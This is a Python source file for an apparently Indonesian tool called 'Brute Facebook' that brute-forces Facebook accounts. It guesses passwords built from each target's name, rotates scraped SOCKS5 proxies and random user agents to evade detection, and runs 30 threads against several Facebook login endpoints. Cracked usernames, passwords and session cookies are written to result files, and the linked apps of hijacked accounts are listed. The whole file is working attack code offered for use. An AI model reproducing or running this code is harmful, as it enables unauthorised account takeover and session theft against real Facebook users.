#######################################################
# Name           : Brute Facebook (BF)                #
# File           : log.py                             #
# Author         : Moch Yayan Juan Alvredo XD.        #
# Github         : https://github.com/Yayan-XD        #
# Facebook       : https://www.facebook.com/KM39453   #
# Website        : https://www.yayanxd.my.id          #
# Python version : 0.4                                #
#######################################################

############# DON'T REMOVE THIS FUNCTIONS #############

import requests, re, random, datetime, time, os
from concurrent.futures import ThreadPoolExecutor as Modol
from bs4 import BeautifulSoup as par
from data import selesai as jg
from datetime import datetime
#---- MODULE RICH IN PYTHON -------
from rich import print as prints
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel
from rich.tree import Tree
#---- PROGRES ------
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
# --- BULAN --------
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ha = current.day
op = bulan[nTemp]
ta = current.year
#------------------------------->
M = '\x1b[1;91m' # MERAH
O = '\x1b[1;96m' # BIRU MUDA
H = '\x1b[1;92m' # HIJAU
N = '\x1b[0m'    # WARNA MATI
#------------------------------->
merah  = '[#FF0022]'
hijau  = '[#00FF33]'
hapus  = '[/]'
biru_m = '[bold cyan]'
###########################################################################################
class Brute_crack:

    def __init__(self, oz):
        self.id, self.apk, self.ok, self.ugen, self.met, self.cp, self.loop = [], [], [], [], [], [], 0
        self.wa, self.tol, self.ses = [], Console(), requests.Session()
        self.id = oz
        self.proxx()
        self.plerr()
    # ------- METODE --------
    def mentod(self):
        self.wa.append(Panel(f"""[{biru_m}1{hapus}] method API (fast)
[{biru_m}2{hapus}] method mbasic (slow)
[{biru_m}3{hapus}] method mobile (super slow)""",title="[green]METODE VALIDATE[/]"))
        self.wa.append(Panel(f"""[{biru_m}4{hapus}] method API (fast)
[{biru_m}5{hapus}] method mbasic (slow)
[{biru_m}6{hapus}] method mobile (super slow)""",title="[green]METODE REGGULER[/]"))
        self.tol.print(Columns(self.wa))
    # ------- NAMPILKAN APLIKASI --------
    def tampilkan_apk(self):
        prints(Panel("menampilkan aplikasi maka akun akan mudah terkena chekpoint dikarenakan memakai module requests berlebihan. tidak di sarankan untuk menampilkan apilkasi."))
        crot = input(f"  [{M}?{N}] ingin menampilkan aplikasi yang terkait [Y/t]: ")
        if crot in[""]:
            print(f"  [{M}!{N}] jangan kosong");self.tampilkan_apk()
        elif crot in["Y","y"]:
            self.apk.append("y")
        elif crot in["T","t"]:
            self.apk.append("t")
        else:
            print(f"  [{M}!{N}] y/t bro");self.tampilkan_apk()
    # ------- UA RANDOM ----------------
    def kentod(self, integer):
        lis = list("1234567890")
        gets = [random.choice(lis) for _ in range(integer)]
        return "".join(gets).upper()
    # ------- INGFO --------
    def ingfo(self):
        prints(Panel(f"""[{biru_m}+{hapus}] hasil OK disimpan ke -> results/OK-{ha}-{op}-{ta}.txt
[{biru_m}+{hapus}] hasil CP disimpan ke -> results/CP-{ha}-{op}-{ta}.txt

[{merah}×{hapus}] hidupkan mode pesawat 2 detik jika tidak ada hasil."""))
    # ------- PROXY --------
    def proxx(self):
        try:
            prox=self.ses.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
            open('data/prox.txt','w').write(prox)
        except Exception as e:
            exit(e)
    # ------- SETTING USER AGENT --------
    def ua_mu(self):
        prints(Panel("Mainkan lah user agent yang menurut anda cocok, jika anda tidak tau cara mendapatkan user agent. Yo usaha sendiri lah ajg"))
        ua = input("  [?] Gunakan user agent bawaan script: [Y/t]: ")
        if ua in [" "]:
            prints(Panel("jangan kosong bro"));time.sleep(3);self.ua_mu()
        elif ua in ["T", "t"]:
            try:os.remove("data/ua_xx.txt")
            except:pass
            xx = input("  [?] masukan user agent: ")
            open("data/ua_xx.txt", "w").write(xx)
            prints(Panel(f"anda menggunakan user agent: [bold green]{xx}"))
        elif ua in ["Y", "y"]:
            try:os.remove("data/ua_xx.txt")
            except:pass
            prints(Panel("Anda menggunakan user agent bawaan script:)"))
        else:
            print(f"  [{M}!{N}] y/t bro");self.ua_mu()

    def ua_set(self):
        for xd in range(1000):
            xx = []
            aa='Mozilla/5.0 (Linux; Android 11;'
            b=random.choice(['6','7','8','9','10','11','12'])
            c='SM-N985F Build/RP1A.200720.012; wv)'
            d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
            e=random.randrange(1, 999)
            f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
            g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58'
            h=random.randrange(73,100)
            i='0'
            j=random.randrange(4200,4900)
            k=random.randrange(40,150)
            l='Mobile Safari/537.36 Instagram 227.0.0.12.117 Android (30/11; 420dpi; 1180x2123; samsung; SM-N985F; c2s; exynos990;'
            uaku=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
            xx.append(uaku)
            self.ugen = random.choice(xx)
        return self.ugen

    # ------- GANTI BAHASA --------
    def language(self, cok):
        try:
            url = self.ses.get('https://mbasic.facebook.com/language/',cookies=cok)
            data = par(url.text,'html.parser')
            for x in data.find_all('form',{'method':'post'}):
                if 'Bahasa Indonesia' in str(x):
                    bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"submit"  : "Bahasa Indonesia"}
                    self.ses.post('https://mbasic.facebook.com' + x['action'],data=bahasa,cookies=cok)
        except:pass
    # ------- PILIH PASSWORD --------
    def plerr(self):
        prints(Panel(f"""Jika anda memilih kata sandi manual, maka system ngedeted password inputan anda sendiri.
atau bisa juga menggunakan kata sandi otomatis [{hijau}password bawaan script{hapus}]"""))
        ___yayanganteng___ = input(f"  [{O}?{N}] apakah anda ingin menggunakan kata sandi manual? [Y/t]: ")
        if ___yayanganteng___ in ["y","Y"]:
            self.tampilkan_apk()
            self.ua_mu()
            prints(Panel("[[bold red]![/]] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih"))
            while True:
                pwek = input(f"  [{O}?{N}] masukan kata sandi : ")
                prints(Panel(f"[{biru_m}*[/]] crack dengan sandi -> [ [bold red]{pwek}[/] ]"))
                if pwek in[""," "]:
                    print(f"  {N}[{M}×{N}] jangan kosong bro kata sandi nya")
                elif len(pwek)<=5:
                    print(f"  {N}[{M}×{N}] kata sandi minimal 6 karakter")
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        global prog,des
                        cin = input(f"  [{O}*{N}] method : ")
                        if cin in[""," "]:
                            print(f"  {N}[{M}×{N}] jangan kosong bro");__yan__()
                        elif cin in["1","01"]:
                            self.ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.id))
                            with prog:
                                with Modol(max_workers=30) as bool:
                                    for i in self.id:
                                        try:
                                            kimochi = i.split('<=>')[0]
                                            bool.submit(self.validate, kimochi, ysc, "free.facebook.com")
                                        except:pass
                            jg.Selesai_crack(self.ok, self.cp)
                        elif cin in["2","02"]:
                            self.ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.id))
                            with prog:
                                with Modol(max_workers=30) as bool:
                                    for i in self.id:
                                        try:
                                            kimochi = i.split('<=>')[0]
                                            bool.submit(self.validate, kimochi, ysc, "mbasic.facebook.com")
                                        except:pass
                            jg.Selesai_crack(self.ok, self.cp)
                        elif cin in["3","03"]:
                            self.ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.id))
                            with prog:
                                with Modol(max_workers=30) as bool:
                                    for i in self.id:
                                        try:
                                            kimochi = i.split('<=>')[0]
                                            bool.submit(self.validate, kimochi, ysc, "m.facebook.com")
                                        except:pass
                            jg.Selesai_crack(self.ok, self.cp)
                        elif cin in["4","04"]:
                            self.ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.id))
                            with prog:
                                with Modol(max_workers=30) as bool:
                                    for i in self.id:
                                        try:
                                            kimochi = i.split('<=>')[0]
                                            bool.submit(self.reguller, kimochi, ysc, "free.facebook.com")
                                        except:pass
                            jg.Selesai_crack(self.ok, self.cp)
                        elif cin in["5","05"]:
                            self.ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.id))
                            with prog:
                                with Modol(max_workers=30) as bool:
                                    for i in self.id:
                                        try:
                                            kimochi = i.split('<=>')[0]
                                            bool.submit(self.reguller, kimochi, ysc, "mbasic.facebook.com")
                                        except:pass
                            jg.Selesai_crack(self.ok, self.cp)
                        elif cin in["6","06"]:
                            self.ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.id))
                            with prog:
                                with Modol(max_workers=30) as bool:
                                    for i in self.id:
                                        try:
                                            kimochi = i.split('<=>')[0]
                                            bool.submit(self.reguller, kimochi, ysc, "m.facebook.com")
                                        except:pass
                            jg.Selesai_crack(self.ok, self.cp)
                        else:
                            print(f"  {N}[{M}!{N}] input yang bener");__yan__()
                    self.mentod()
                    __yan__(pwek.split(","))
                    break
        elif ___yayanganteng___ in ["t","T"]:
            self.tampilkan_apk()
            self.ua_mu()
            self.mentod()
            self.__pler__()
        else:
            print(f"  [{M}!{N}] y/t bro");self.plerr()
    ###---[ CONVERT COOKIE ]---###
    def ngoxok(self, cooz):
        coki = "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"
        return(str(coki))
    # ------- METODE LOGIN --------
    def validate(self, user, pasw, cebok):
        prog.update(des,description=f"{str(self.loop)}/{len(self.id)} OK-:[bold green]{len(self.ok)}[/] CP-:[bold yellow]{len(self.cp)}[/]")
        prog.advance(des)
        pros=open("data/prox.txt" ,"r").read().splitlines()
        for pw in pasw:
            try:
                ses=requests.Session()
                nip=random.choice(pros)
                proxs= {'http': 'socks5://'+nip}
                try:
                    xxx=open("data/ua_xx.txt" ,"r").read().splitlines()
                    for i in xxx:
                        uas = i
                except:uas=self.ua_set()
                ses.headers.update({'Host': cebok,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': uas,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                p = ses.get(f'https://{cebok}/login/device-based/password/?uid={user}&flow=login_no_pin&next=https%3A%2F%2F{cebok}%2Fv6.0%2Fdialog%2Foauth%3Fclient_id%3D2036793259884297%26cbt%3D1622205732064%26e2e%3D%257B%2522init%2522%253A1622205732064%257D%26ies%3D1%26sdk%3Dandroid-6.3.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D%26default_audience%3Dfriends%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4da6f37f-2993-49cd-b08c-11e3de85d49c%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=https%3A%2F%2F{cebok}%2Fv6.0%2Fdialog%2Foauth&_rdr')
                dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":user,"next":"https://"+cebok+"/v7.0/dialog/oauth?app_id=3D2036793259884297%26cbt%3D1622205732064%26e2e%3D%257B%2522init%2522%253A1622205732064%257D%26ies%3D1%26sdk%3Dandroid-6.3.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D%26default_audience%3Dfriends%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4da6f37f-2993-49cd-b08c-11e3de85d49c%26tp%3Dunspecified","flow":"login_no_pin","pass":pw,}
                koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
                koki+=' m_pixel_ratio=2.625; wd=412x756'
                heade={'Host': cebok,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': cebok,'content-type': 'application/x-www-form-urlencoded','user-agent': uas,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://'+cebok+'/login/device-based/password/?uid='+user+'&flow=login_no_pin&next=https%3A%2F%2F'+cebok+'%2Fv6.0%2Fdialog%2Foauth%3Fclient_id%3D2036793259884297%26cbt%3D1622205732064%26e2e%3D%257B%2522init%2522%253A1622205732064%257D%26ies%3D1%26sdk%3Dandroid-6.3.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D%26default_audience%3Dfriends%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4da6f37f-2993-49cd-b08c-11e3de85d49c%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=https%3A%2F%2F'+cebok+'%2Fv6.0%2Fdialog%2Foauth&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                po = ses.post(f'https://{cebok}/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
                if "c_user" in ses.cookies.get_dict():
                    digi = random.choice([2])
                    digi = self.kentod(digi)
                    coki = self.ngoxok(ses.cookies.get_dict())
                    if "y" in self.apk:
                        self.cek_apk(user, pw, coki, digi)
                    elif "t" in self.apk:
                        tree = Tree("")
                        tree.add(f"[bold green]{user}|{pw}").add(f"[bold green]{coki}ua={digi}")
                        prints(tree)
                    wrt = " [✓] "+user+"|"+pw+"|"+coki
                    self.ok.append(wrt)
                    with open(f"results/OK/OK-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as r:
                        r.write(wrt+"\n")
                    break
                elif "checkpoint" in ses.cookies.get_dict():
                    tree = Tree("")
                    tree.add(f"[bold yellow]{user}|{pw}")
                    prints(tree)
                    wrt = " [×] "+user+"|"+pw
                    self.cp.append(wrt)
                    with open(f"results/CP/CP-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as w:
                        w.write(wrt+"\n")
                    break
                else:
                    continue
#            except Exception as e:
#                prints(e)
            except requests.exceptions.ConnectionError:
                time.sleep(3)
        self.loop+=1

    def reguller(self, user, pasw, cebok):
        prog.update(des,description=f"{str(self.loop)}/{len(self.id)} OK-:[bold green]{len(self.ok)}[/] CP-:[bold yellow]{len(self.cp)}[/]")
        prog.advance(des)
        for pw in pasw:
            try:
                ses=requests.Session()
                try:
                    xxx=open("data/ua_xx.txt" ,"r").read().splitlines()
                    for i in xxx:
                        uas = i
                except:uas=self.ua_set()
                ses.headers.update({'Host': cebok,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': uas,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                p = ses.get(f'https://{cebok}/login.php?skip_api_login=1&api_key=847163265704696&kid_directed_site=0&app_id=847163265704696&signed_next=1&next=https%3A%2F%2F{cebok}%2Fv3.0%2Fdialog%2Foauth%3Fapp_id%3D847163265704696%26auth_type%3Dreauthenticate%26cbt%3D1660888428692%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2958071895c0f8%2526domain%253Dwww.pointblank.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.pointblank.id%25252Ff2805d42d78107c%2526relation%253Dopener%26client_id%3D847163265704696%26display%3Dtouch%26domain%3Dwww.pointblank.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.pointblank.id%252Fmember%252Fsignup%26locale%3Did_ID%26logger_id%3Df223011f07f3198%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df335b986099f298%2526domain%253Dwww.pointblank.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.pointblank.id%25252Ff2805d42d78107c%2526relation%253Dopener%2526frame%253Df3639974eb4b5d%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv3.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df335b986099f298%26domain%3Dwww.pointblank.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.pointblank.id%252Ff2805d42d78107c%26relation%3Dopener%26frame%3Df3639974eb4b5d%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr')
                suhk = par(p.text, "html.parser")
                xxxx = suhk.find("form",{"method":"post"})["action"]
                date = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
                    "email":user,
                    "next":"https://"+cebok+"/v3.0/dialog/oauth?app_id=847163265704696&auth_type=reauthenticate&cbt=1660888428692&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2958071895c0f8%26domain%3Dwww.pointblank.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.pointblank.id%252Ff2805d42d78107c%26relation%3Dopener&client_id=847163265704696&display=touch&domain=www.pointblank.id&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fwww.pointblank.id%2Fmember%2Fsignup&locale=id_ID&logger_id=f223011f07f3198&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df335b986099f298%26domain%3Dwww.pointblank.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.pointblank.id%252Ff2805d42d78107c%26relation%3Dopener%26frame%3Df3639974eb4b5d&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=true&scope=email%2Cpublic_profile&sdk=joey&version=v3.0",
                    "pass":pw,
                    "login":"submit"
                }
                koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
                koki+=' m_pixel_ratio=2.625; wd=412x756'
                po = ses.post(f"https://{cebok}{xxxx}", data=date, cookies={'cookie': koki},headers={"user-agent":uas},allow_redirects=False)
                if "c_user" in ses.cookies.get_dict():
                    digi = random.choice([2])
                    digi = self.kentod(digi)
                    coki = self.ngoxok(ses.cookies.get_dict())
                    if "y" in self.apk:
                        self.cek_apk(user, pw, coki, digi)
                    elif "t" in self.apk:
                        tree = Tree("")
                        tree.add(f"[bold green]{user}|{pw}").add(f"[bold green]{coki}ua={digi}")
                        prints(tree)
                    wrt = " [✓] "+user+"|"+pw+"|"+coki
                    self.ok.append(wrt)
                    with open(f"results/OK/OK-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as r:
                        r.write(wrt+"\n")
                    break
                elif "checkpoint" in ses.cookies.get_dict():
                    tree = Tree("")
                    tree.add(f"[bold yellow]{user}|{pw}")
                    prints(tree)
                    wrt = " [×] "+user+"|"+pw
                    self.cp.append(wrt)
                    with open(f"results/CP/CP-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as w:
                        w.write(wrt+"\n")
                    break
                else:
                    continue
#            except Exception as e:
#                prints(e)
            except requests.exceptions.ConnectionError:
                time.sleep(3)
        self.loop+=1
    # ------- MENGECEK APLIKASI --------
    def cek_apk(self, user, pw, cok, ahh):
        cookie = {"cookie":cok}
        self.language(cookie)
        tree = Tree("                                ")
        tree.add(f"[bold green]{user}|{pw}|[bold green]{cok};ua={ahh}")
        try:
            active = Tree(f"\r{hijau}Aplikasi aktif :")
            url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
            self.get_active(url,active,cookie)
        except Exception as e:
            prints(e)
        try:
            inactive = Tree(f"\r{merah}Aplikasi kadaluarsa :")
            url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
            self.get_inactive(url,inactive,cookie)
        except Exception as e:
            prints(e)
        tree.add(active)
        tree.add(inactive)
        prints(tree)

    def get_active(self,url,active,cookie):
        try:
            data = par(self.ses.get(url,cookies=cookie).text,"html.parser")
            for apk in data.find_all("h3"):
                if "Ditambahkan" in apk.text:
                    active.add(f"\r{H}{str(apk.text).replace('Ditambahkan',f' {N}- Ditambahkan')}{N}")
                else:continue
            next = "https://mbasic.facebook.com" + data.find("a",string="Lihat Lainnya")["href"]
            self.get_active(next,active,cookie)
        except:pass

    def get_inactive(self,url,inactive,cookie):
        try:
            data = par(self.ses.get(url,cookies=cookie).text,"html.parser")
            for apk in data.find_all("h3"):
                if "Kedaluwarsa" in apk.text:
                    inactive.add(f"\r{M}{str(apk.text).replace('Kedaluwarsa',f' {N}- Kedaluwarsa')}{N}")
                else:continue
            next = "https://mbasic.facebook.com" + data.find("a",string="Lihat Lainnya")["href"]
            self.get_inactive(next,inactive,cookie)
        except:pass

    # ------- METODE PILIHAN --------
    def __pler__(self):
        yan = input(f"  [{O}*{N}] method : ")
        if yan in [""," "]:
            print(f"  {N}[{M}×{N}] jangan kosong bro");self.__pler__()
        elif yan in ["01","1"]:
            self.met.append("free")
            self.progg()
        elif yan in ["02","2"]:
            self.met.append("mbasic")
            self.progg()
        elif yan in ["03","3"]:
            self.met.append("mobile")
            self.progg()
        elif yan in ["04","4"]:
            self.met.append("free_1")
            self.progg()
        elif yan in ["05","5"]:
            self.met.append("mbasic_1")
            self.progg()
        elif yan in ["06","6"]:
            self.met.append("mobile_1")
            self.progg()
        else:
            print(f"  {N}[{M}×{N}] input yang bener");self.__pler__()
    # ------- PROGRESS ------------
    def progg(self):
        self.ingfo()
        global prog,des
        prog = Progress(SpinnerColumn('smiley'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
        des = prog.add_task('',total=len(self.id))
        with prog:
            with Modol(max_workers=30) as bool:
                for user in self.id:
                    uid,nmf = user.split('<=>')[0],user.split('<=>')[1].lower()
                    frs = nmf.split(' ')[0]
                    pwx = []
                    if len(nmf)<6:
                        if len(frs)<3:
                            pass
                        else:
                            pwx.append(nmf)
                            pwx.append(frs+'1234')
                            pwx.append(frs+'321')
                    else:
                        if len(frs)<3:
                            pwx.append(nmf)
                        else:
                            pwx.append(nmf)
                            pwx.append(frs+'1234')
                            pwx.append(frs+'321')
                    if "free" in self.met:
                        bool.submit(self.validate, uid, pwx, "free.facebook.com")
                    elif  "mbasic" in self.met:
                        bool.submit(self.validate, uid, pwx, "mbasic.facebook.com")
                    elif  "mobile" in self.met:
                        bool.submit(self.validate, uid, pwx, "m.facebook.com")
                    elif  "free_1" in self.met:
                        bool.submit(self.reguller, uid, pwx, "free.facebook.com")
                    elif  "mbasic_1" in self.met:
                        bool.submit(self.reguller, uid, pwx, "mbasic.facebook.com")
                    elif  "mobile_1" in self.met:
                        bool.submit(self.reguller, uid, pwx, "m.facebook.com")
                    else:
                        bool.submit(self.reguller, uid, pwx, "m.facebook.com")

        jg.Selesai_crack(self.ok, self.cp)